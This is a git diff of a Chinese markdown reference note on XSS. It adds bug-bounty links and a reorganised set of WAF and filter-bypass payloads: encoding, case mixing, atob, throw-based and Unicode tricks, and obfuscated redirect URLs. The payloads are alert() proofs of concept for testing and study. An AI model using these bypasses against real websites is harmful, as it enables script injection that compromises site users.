@@ -29,6 +29,7 @@
 - [实战|通过恶意 pdf 执行 xss 漏洞](https://mp.weixin.qq.com/s/D1XFNR-4qg9GUkZeyMZsyw)
 - [SVG based Stored XSS](https://prashantbhatkal2000.medium.com/svg-based-stored-xss-ee6e9b240dee)
 - [XSS With Hoisting](https://brutelogic.com.br/blog/xss-with-hoisting/)
+- [Paragraph Separator(U+2029) XSS](https://www.hahwul.com/2022/02/06/u-2029-xss/)
 
 **相关案例**
 - [BugBounty:Twitter 蠕虫 XSS](https://xz.aliyun.com/t/5050)
@@ -42,7 +43,8 @@
 - [How I alert(1) in Azure DevOps](https://5alt.me/2019/02/xss-in-azure-devops/)
 - [Stored XSS to Organisation Takeover](https://infosecwriteups.com/stored-xss-to-organisation-takeover-6eaaa2fdcd5b)
 - [[BugBounty] XSS with Markdown — Exploit & Fix on OpenSource](https://lethanhphuc-pk.medium.com/bugbounty-xss-with-markdown-exploit-fix-on-opensource-1baecebe9645) - markdown xss 案例
-
+- [BountyHunterInChina/重生之我是赏金猎人(五)-多手法绕过WAF挖掘某知名厂商XSS.pdf](https://github.com/J0o1ey/BountyHunterInChina/blob/main/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA(%E4%BA%94)-%E5%A4%9A%E6%89%8B%E6%B3%95%E7%BB%95%E8%BF%87WAF%E6%8C%96%E6%8E%98%E6%9F%90%E7%9F%A5%E5%90%8D%E5%8E%82%E5%95%86XSS.pdf)
+- [BountyHunterInChina/重生之我是赏金猎人(七)-看我如何从FUZZ到XSS在SRC官网偷走你的个人信息.pdf](https://github.com/J0o1ey/BountyHunterInChina/blob/main/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA(%E4%B8%83)-%E7%9C%8B%E6%88%91%E5%A6%82%E4%BD%95%E4%BB%8EFUZZ%E5%88%B0XSS%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E5%81%B7%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF.pdf)
 
 **相关工具**
 - [s0md3v/XSStrike](https://github.com/s0md3v/XSStrike) - XSS 检测工具,效果一般
@@ -101,10 +103,10 @@
 - [XSS 挑战-WalkThrough](../靶场/XSS挑战-WalkThrough.md)
 
 **payload**
+- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 - [ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
 - [masatokinugawa/filterbypass](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
 - [bugbounty-cheatsheet/cheatsheets/xss.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
-- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 - [aurebesh.js – Translate JavaScript to Other Writing Systems](https://aem1k.com/aurebesh.js/)
 - [cujanovic/Markdown-XSS-Payloads](https://github.com/cujanovic/Markdown-XSS-Payloads) - XSS payloads for exploiting Markdown syntax
 
@@ -134,6 +136,7 @@ XSS 攻击有 3 种类型：
 ### XSS Payload
 
 #### 最基础的
+
 ```html
 <script>alert(1)</script>
 <svg/onload=alert(1)>
@@ -141,6 +144,7 @@ XSS 攻击有 3 种类型：
 ```
 
 #### 在标签内部的
+
 ```html
 " onmouseover=alert(1)
 " autofocus onfocus=alert(1)
@@ -322,7 +326,7 @@ exiftool -Artist='"><script>alert(1)</script>' test.jpeg
 
 ### 长度限制
 
-**绕过长度限制**
+绕过长度限制
 ```js
 "onclick=alert(1)//
 "><!--
@@ -331,64 +335,85 @@ exiftool -Artist='"><script>alert(1)</script>' test.jpeg
 
 ### 内容检测
 
-**换行**
+#### 换行
 ```js
 <img src=1
 onerror
 =alert(1)
 ```
 
-**过滤空格,用 / 代替空格**
+#### 过滤空格,用 / 代替空格
 ```js
 <img/src="x"/onerror=alert("xss");>
 ```
 
-**过滤关键字,大小写绕过**
+#### 过滤关键字,大小写绕过
 ```html
 <ImG sRc=x onerRor=alert("xss");>
 <scRiPt>alert(1);</scrIPt>
 ```
 
-**不闭合**
+#### 不闭合
 ```js
 <svg onload="alert(1)"
 ```
 
-**拼接**
+#### 拼接
 ```js
 <details open ontoggle=top['al'%2B'ert'](1) >
 ```
 
-**双写关键字**
+#### 双写关键字
 
 有些 waf 可能会只替换一次且是替换为空,这种情况下我们可以考虑双写关键字绕过
 ```js
 <imimgg srsrcc=x onerror=alert("xss");>
 ```
 
-**替换绕过**
+#### 替换绕过
+
+过滤 eval 用 Function 代替
+```
+❌ eval(alert('xss'))
+✔ Function(alert('xss'))
+```
+
+过滤 ('') 用 `` 代替绕过
+```
+❌ alert('xss')
+✔ alert`xss`
+```
 
 过滤 alert 用 prompt,confirm,top['alert'](1) 代替绕过
-过滤 () 用 ``代替绕过
 过滤空格 用 %0a(换行符),%0d(回车符),/**/ 代替绕过
 小写转大写情况下 字符 ſ 大写后为 S(ſ 不等于 s)
 
-**利用 eval**
+#### 利用 atob 绕过
+
+```
+❌ (alert('xss'))
+✔ atob("YWxlcnQoInhzcyIp")
+```
+
+#### 利用 eval
+
 ```js
 <img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">
 ```
 
-**利用 top**
+#### 利用 top
+
 ```js
 <script>top["al"+"ert"](`xss`);</script>
 ```
 
-**%00截断绕过**
+#### %00截断绕过
+
 ```js
 <a href=javascr%00ipt:alert(1)>xss</a>
 ```
 
-**其它字符混淆**
+#### 其它字符混淆
 
 有的 waf 可能是用正则表达式去检测是否有 xss 攻击,如果我们能 fuzz 出正则的规则,则我们就可以使用其它字符去混淆我们注入的代码了,举几个简单的例子
 
@@ -399,7 +424,7 @@ onerror
 <SCRIPT>var a="\\";alert("xss");//";</SCRIPT>
 ```
 
-**编码绕过**
+#### 通过编码绕过
 ```js
 实体编码
 javascrip&#x74;:alert(1) 十六进制
@@ -430,7 +455,7 @@ base64绕过
 <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
 ```
 
-**过滤双引号,单引号**
+#### 过滤双引号,单引号
 
 ```js
 1.如果是html标签中,我们可以不用引号.如果是在js中,我们可以用反引号代替单双引号
@@ -438,45 +463,39 @@ base64绕过
 2.使用编码绕过,具体看上面我列举的例子,我就不多赘述了
 ```
 
+#### 过滤括号
+
 ```js
-过滤括号
 当括号被过滤的时候可以使用throw来绕过
 <svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
 ```
 
+#### 过滤url地址
+
 ```js
-过滤url地址
-使用url编码
+// 使用url编码
 <img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>
 
-使用IP
-1.十进制IP
+// 使用IP
+// 1.十进制IP
 <img src="x" onerror=document.location=`http://2130706433/`>
 
-2.八进制IP
+// 2.八进制IP
 <img src="x" onerror=document.location=`http://0177.0.0.01/`>
 
-3.hex
+// 3.hex
 <img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>
 
-4.html标签中用//可以代替http://
+// 4.html标签中用//可以代替http://
 <img src="x" onerror=document.location=`//www.baidu.com`>
 
-5.使用\\
-但是要注意在windows下\本身就有特殊用途,是一个path 的写法,所以\\在Windows下是file协议,在linux下才会是当前域的协议
+// 5.使用\\,但是要注意在windows下\本身就有特殊用途,是一个path 的写法,所以\\在Windows下是file协议,在linux下才会是当前域的协议
 
-6.使用中文逗号代替英文逗号
-如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号
+// 6.使用中文逗号代替英文逗号,如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号
 <img src="x" onerror="document.location=`http://www.baidu.com`">//会自动跳转到百度
 ```
 
-```js
-fromCharCode方法绕过
-String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)
-eval(FromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))
-```
-
-**javascript 伪协议绕过**
+#### javascript 伪协议绕过
 
 无法闭合双引号的情况下,就无法使用 onclick 等事件,只能伪协议绕过,或者调用外部 js
 ```js
@@ -514,9 +533,17 @@ eval(FromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))
 alert(1) //
 ```
 
-**输入会被大写化**
+#### 输入会被大写化
 
 先把纯文本字符转换为 HTML 实体字符, 然后对其进行 URL 编码, 最后用 SVG 标记的 onload 参数输出
 ```html
 <svg onload=%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x27%3B%26%23x48%3B%26%23x69%3B%26%23x20%3B%26%23x4D%3B%26%23x6F%3B%26%23x6D%3B%26%23x27%3B%26%23x29%3B>
+```
+
+#### U+2029 XSS
+
+段落分隔符，即 U+2029，是用于字符分隔的 Unicode 值，但它是一个在网络上不常使用的字符。
+
+```js
+#!@*% alert(1)
 ```
